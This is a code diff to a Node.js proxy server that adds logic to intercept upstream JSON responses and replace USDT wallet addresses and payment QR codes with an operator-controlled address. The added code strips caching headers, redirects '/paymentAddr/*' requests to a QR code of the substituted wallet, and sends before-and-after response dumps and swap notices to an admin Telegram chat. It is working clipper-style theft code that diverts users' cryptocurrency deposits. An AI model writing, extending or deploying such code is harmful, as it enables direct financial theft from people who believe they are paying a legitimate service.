@@ -199,7 +199,33 @@ async function transparentProxy(req, res) {
     });
     
     const body = await response.arrayBuffer();
-    const buf = Buffer.from(body);
+    let buf = Buffer.from(body);
+
+    try {
+      const bankData = await loadData();
+      if (bankData.usdtAddress) {
+        let bodyStr = buf.toString('utf8');
+        let jsonResp = null;
+        try { jsonResp = JSON.parse(bodyStr); } catch(e) {}
+        if (jsonResp) {
+          const result = replaceUsdtInResponse(jsonResp, bankData, req.path);
+          if (result && result.oldAddr) {
+            const newBody = JSON.stringify(jsonResp);
+            buf = Buffer.from(newBody);
+            respHeaders['content-type'] = 'application/json; charset=utf-8';
+            respHeaders['content-length'] = String(buf.length);
+            respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
+            delete respHeaders['etag'];
+            delete respHeaders['last-modified'];
+            if (bankData.adminChatId && bot && bankData.logRequests) {
+              try {
+                await bot.sendMessage(bankData.adminChatId, `🔄 USDT replaced in ${req.method} ${req.path}\nOld: ${result.oldAddr}\nNew: ${result.newAddr}`);
+              } catch(e) {}
+            }
+          }
+        }
+      }
+    } catch(e) {}
 
     res.writeHead(response.status, respHeaders);
     res.end(buf);
@@ -1155,50 +1181,70 @@ app.all('/user/*', async (req, res) => {
   await proxyAndAddBonus(req, res);
 });
 
+function replaceUsdtInResponse(jsonResp, bankData, label) {
+  if (!bankData.usdtAddress || !jsonResp) return null;
+  const newAddr = bankData.usdtAddress;
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
+
+  function scanAndReplace(obj, depth) {
+    if (!obj || typeof obj !== 'object' || depth > 10) return;
+    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return; }
+    let oldAddr = '';
+    for (const key of Object.keys(obj)) {
+      const kl = key.toLowerCase();
+      if (typeof obj[key] === 'string') {
+        if (kl.includes('usdt') && kl.includes('addr') || kl === 'address' || kl === 'customusdtaddress' || kl === 'walletaddress' || kl === 'addr') {
+          if (obj[key].length >= 20 && obj[key] !== newAddr) {
+            oldAddr = oldAddr || obj[key];
+            obj[key] = newAddr;
+          }
+        }
+        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrcodeurl') {
+          obj[key] = qrUrl;
+        }
+      } else if (typeof obj[key] === 'object') {
+        scanAndReplace(obj[key], depth + 1);
+      }
+    }
+    if (oldAddr) {
+      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      const re = new RegExp(escaped, 'g');
+      for (const key of Object.keys(obj)) {
+        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
+          obj[key] = obj[key].replace(re, newAddr);
+        }
+      }
+    }
+    return oldAddr;
+  }
+
+  let foundOld = '';
+  if (jsonResp.data) foundOld = scanAndReplace(jsonResp.data, 0) || '';
+  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
+  return { oldAddr: foundOld, newAddr, qrUrl };
+}
+
 app.all('/usdt', async (req, res) => {
   try {
     const bankData = await loadData();
     const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
 
-    if (jsonResp && jsonResp.data && bankData.adminChatId && bot && bankData.logRequests) {
+    if (jsonResp && bankData.adminChatId && bot && bankData.logRequests) {
       try {
-        const dump = JSON.stringify(jsonResp.data, null, 2).substring(0, 3500);
-        await bot.sendMessage(bankData.adminChatId, `📋 /usdt response dump:\n${dump}`);
+        const target = jsonResp.data || jsonResp;
+        const dump = JSON.stringify(target, null, 2).substring(0, 3500);
+        await bot.sendMessage(bankData.adminChatId, `📋 /usdt BEFORE:\n${dump}`);
       } catch(e) {}
     }
 
-    if (bankData.usdtAddress && jsonResp && jsonResp.data) {
-      const d = jsonResp.data;
-      const newAddr = bankData.usdtAddress;
-      const oldAddr = d.usdtAddress || d.address || d.customUsdtAddress || '';
-      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
+    const result = replaceUsdtInResponse(jsonResp, bankData, '/usdt');
 
-      if (d.usdtAddress !== undefined) d.usdtAddress = newAddr;
-      if (d.address !== undefined) d.address = newAddr;
-      if (d.customUsdtAddress !== undefined) d.customUsdtAddress = newAddr;
-      if (d.walletAddress !== undefined) d.walletAddress = newAddr;
-      if (d.addr !== undefined) d.addr = newAddr;
-
-      if (d.qrCode !== undefined) d.qrCode = qrUrl;
-      if (d.qrCodeUrl !== undefined) d.qrCodeUrl = qrUrl;
-      if (d.qr !== undefined) d.qr = qrUrl;
-      if (d.codeUrl !== undefined) d.codeUrl = qrUrl;
-
-      if (oldAddr) {
-        const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-        const re = new RegExp(escaped, 'g');
-        for (const key of Object.keys(d)) {
-          if (typeof d[key] === 'string' && d[key].includes(oldAddr)) {
-            d[key] = d[key].replace(re, newAddr);
-          }
-        }
-      }
-
-      if (bankData.adminChatId && bot) {
-        try {
-          await bot.sendMessage(bankData.adminChatId, `💰 USDT replaced!\nOld: ${oldAddr}\nNew: ${newAddr}\nQR: ${qrUrl.substring(0, 60)}...`);
-        } catch(e) {}
-      }
+    if (result && bankData.adminChatId && bot) {
+      try {
+        const target = jsonResp.data || jsonResp;
+        const afterDump = JSON.stringify(target, null, 2).substring(0, 2000);
+        await bot.sendMessage(bankData.adminChatId, `✅ /usdt AFTER:\n${afterDump}`);
+      } catch(e) {}
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1209,7 +1255,38 @@ app.all('/usdt', async (req, res) => {
 });
 
 app.all('/usdt/rate', async (req, res) => {
-  await transparentProxy(req, res);
+  try {
+    const bankData = await loadData();
+    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
+
+    if (jsonResp && bankData.adminChatId && bot && bankData.logRequests) {
+      try {
+        const target = jsonResp.data || jsonResp;
+        const dump = JSON.stringify(target, null, 2).substring(0, 3500);
+        await bot.sendMessage(bankData.adminChatId, `📋 /usdt/rate dump:\n${dump}`);
+      } catch(e) {}
+    }
+
+    replaceUsdtInResponse(jsonResp, bankData, '/usdt/rate');
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch (e) {
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+  }
+});
+
+app.all('/paymentAddr/*', async (req, res) => {
+  try {
+    const bankData = await loadData();
+    if (bankData.usdtAddress) {
+      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(bankData.usdtAddress)}`;
+      res.writeHead(302, { 'Location': qrUrl, 'Cache-Control': 'no-store, no-cache' });
+      res.end();
+      return;
+    }
+    await transparentProxy(req, res);
+  } catch (e) {
+    await transparentProxy(req, res);
+  }
 });
 
 app.get('/health', async (req, res) => {
